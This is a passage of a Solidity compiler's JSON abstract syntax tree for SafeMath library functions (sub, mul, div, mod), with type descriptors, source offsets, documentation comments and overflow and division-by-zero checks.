														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 581,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3213:49:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 582,
												"nodeType": "ExpressionStatement",
												"src": "3213:49:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 585,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 583,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 569,
														"src": "3279:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 584,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 571,
														"src": "3283:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3279:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 575,
												"id": 586,
												"nodeType": "Return",
												"src": "3272:12:1"
											}
										]
									},
									"documentation": {
										"id": 567,
										"nodeType": "StructuredDocumentation",
										"src": "2871:260:1",
										"text": "@dev Returns the subtraction of two unsigned integers, reverting on\noverflow (when the result is negative).\n     * Counterpart to Solidity's `-` operator.\n     * Requirements:\n     * - Subtraction cannot overflow."
									},
									"id": 588,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 572,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 569,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 588,
												"src": "3149:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 568,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3149:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 571,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 588,
												"src": "3160:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 570,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3160:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3148:22:1"
									},
									"returnParameters": {
										"id": 575,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 574,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 588,
												"src": "3194:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 573,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3194:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3193:9:1"
									},
									"scope": 739,
									"src": "3136:155:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 621,
										"nodeType": "Block",
										"src": "3605:148:1",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 600,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 598,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 591,
														"src": "3619:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 599,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3624:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "3619:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 603,
												"nodeType": "IfStatement",
												"src": "3615:20:1",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 601,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3634:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"functionReturnParameters": 597,
													"id": 602,
													"nodeType": "Return",
													"src": "3627:8:1"
												}
											},
											{
												"assignments": [
													605
												],
												"declarations": [
													{
														"constant": false,
														"id": 605,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 621,
														"src": "3645:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 604,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "3645:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 609,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 608,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 606,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 591,
														"src": "3657:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 607,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 593,
														"src": "3661:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3657:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3645:17:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 615,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 613,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 611,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 605,
																	"src": "3680:1:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 612,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 591,
																	"src": "3684:1:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3680:5:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 614,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 593,
																"src": "3689:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3680:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 616,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3692:35:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 610,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3672:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 617,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3672:56:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 618,
												"nodeType": "ExpressionStatement",
												"src": "3672:56:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 619,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 605,
													"src": "3745:1:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 597,
												"id": 620,
												"nodeType": "Return",
												"src": "3738:8:1"
											}
										]
									},
									"documentation": {
										"id": 589,
										"nodeType": "StructuredDocumentation",
										"src": "3297:236:1",
										"text": "@dev Returns the multiplication of two unsigned integers, reverting on\noverflow.\n     * Counterpart to Solidity's `*` operator.\n     * Requirements:\n     * - Multiplication cannot overflow."
									},
									"id": 622,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 594,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 591,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 622,
												"src": "3551:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 590,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3551:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 593,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 622,
												"src": "3562:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 592,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3562:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3550:22:1"
									},
									"returnParameters": {
										"id": 597,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 596,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 622,
												"src": "3596:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 595,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3596:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3595:9:1"
									},
									"scope": 739,
									"src": "3538:215:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 643,
										"nodeType": "Block",
										"src": "4284:83:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 635,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 633,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 627,
																"src": "4302:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 634,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4306:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4302:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 636,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4309:28:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 632,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "4294:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 637,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4294:44:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 638,
												"nodeType": "ExpressionStatement",
												"src": "4294:44:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 641,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 639,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 625,
														"src": "4355:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 640,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 627,
														"src": "4359:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4355:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 631,
												"id": 642,
												"nodeType": "Return",
												"src": "4348:12:1"
											}
										]
									},
									"documentation": {
										"id": 623,
										"nodeType": "StructuredDocumentation",
										"src": "3759:453:1",
										"text": "@dev Returns the integer division of two unsigned integers, reverting on\ndivision by zero. The result is rounded towards zero.\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n`revert` opcode (which leaves remaining gas untouched) while Solidity\nuses an invalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n     * - The divisor cannot be zero."
									},
									"id": 644,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 628,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 625,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 644,
												"src": "4230:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 624,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4230:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 627,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 644,
												"src": "4241:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 626,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4241:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4229:22:1"
									},
									"returnParameters": {
										"id": 631,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 630,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 644,
												"src": "4275:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 629,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4275:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4274:9:1"
									},
									"scope": 739,
									"src": "4217:150:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 665,
										"nodeType": "Block",
										"src": "4887:81:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 657,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 655,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 649,
																"src": "4905:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 656,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4909:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4905:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 658,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4912:26:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 654,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "4897:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 659,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4897:42:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 660,
												"nodeType": "ExpressionStatement",
												"src": "4897:42:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 663,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 661,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 647,
														"src": "4956:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 662,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 649,
														"src": "4960:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4956:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 653,
												"id": 664,
												"nodeType": "Return",
												"src": "4949:12:1"
											}
										]
									},
									"documentation": {
										"id": 645,
										"nodeType": "StructuredDocumentation",
										"src": "4373:442:1",
										"text": "@dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\nreverting when dividing by zero.\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\nopcode (which leaves remaining gas untouched) while Solidity uses an\ninvalid opcode to revert (consuming all remaining gas).\n     * Requirements:\n     * - The divisor cannot be zero."
									},
									"id": 666,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 650,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 647,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 666,
												"src": "4833:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 646,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4833:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 649,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 666,
												"src": "4844:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 648,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4844:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4832:22:1"
									},
									"returnParameters": {
										"id": 653,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 652,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 666,
												"src": "4878:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 651,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4878:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4877:9:1"
									},
									"scope": 739,
									"src": "4820:148:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 689,
										"nodeType": "Block",
										"src": "5527:68:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 681,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 679,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 671,
																"src": "5545:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 680,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 669,
																"src": "5550:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "5545:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 682,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 673,
															"src": "5553:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 678,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5537:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 683,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5537:29:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 684,
												"nodeType": "ExpressionStatement",
												"src": "5537:29:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 687,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 685,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 669,
														"src": "5583:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 686,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 671,
														"src": "5587:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5583:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 677,
												"id": 688,
												"nodeType": "Return",
												"src": "5576:12:1"
											}
										]
									},
									"documentation": {
										"id": 667,
										"nodeType": "StructuredDocumentation",
										"src": "4974:453:1",
